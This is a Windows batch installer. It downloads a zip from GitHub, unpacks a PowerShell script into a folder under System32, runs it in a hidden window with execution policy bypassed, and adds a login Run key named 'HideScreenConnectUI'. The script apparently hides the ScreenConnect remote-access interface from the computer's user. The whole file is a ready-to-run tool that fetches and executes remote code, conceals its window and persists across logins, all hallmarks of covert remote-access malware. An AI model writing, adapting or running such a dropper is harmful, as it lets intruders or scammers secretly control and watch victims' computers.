@echo off
setlocal EnableExtensions

set "ZIP_URL=https://github.com/chanelwolthuis-del/hidezip/archive/refs/heads/main.zip"
set "BASE_DIR=%SystemRoot%\System32"
set "INSTALL_DIR=%BASE_DIR%\hide"
set "ZIP_FILE=%TEMP%\hide-github.zip"
set "INNER_ZIP=%TEMP%\hidezip-main\hide-sc.zip"
set "PS=%SystemRoot%\System32\WindowsPowerShell\v1.0\powershell.exe"
set "SCRIPT=%INSTALL_DIR%\hide-sc.ps1"

echo [1/4] Downloading...
"%PS%" -NoProfile -Command "Invoke-WebRequest -Uri '%ZIP_URL%' -OutFile '%ZIP_FILE%'"
if errorlevel 1 goto :fail

echo [2/4] Saving to %INSTALL_DIR% ...
if not exist "%INSTALL_DIR%" mkdir "%INSTALL_DIR%"
"%PS%" -NoProfile -Command "$b=Join-Path $env:TEMP 'hidezip-main'; if(Test-Path $b){Remove-Item $b -Recurse -Force}; Expand-Archive -LiteralPath '%ZIP_FILE%' -DestinationPath $env:TEMP -Force; if(Test-Path '%INSTALL_DIR%'){Get-ChildItem '%INSTALL_DIR%' | Remove-Item -Recurse -Force}; Expand-Archive -LiteralPath '%INNER_ZIP%' -DestinationPath '%INSTALL_DIR%' -Force"
if errorlevel 1 goto :fail
if not exist "%SCRIPT%" goto :fail

echo [3/4] Starting hider (detached - survives CMD close)...
start "" "%PS%" -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File "%SCRIPT%"

echo [4/4] Adding auto-start at login...
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "HideScreenConnectUI" /t REG_SZ /d "\"%PS%\" -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File \"%SCRIPT%\"" /f

echo.
echo Done. Files saved to %INSTALL_DIR%
echo You can close this window - hider keeps running in background.
exit /b 0

:fail
echo Install failed. Check internet connection and try again.
exit /b 1
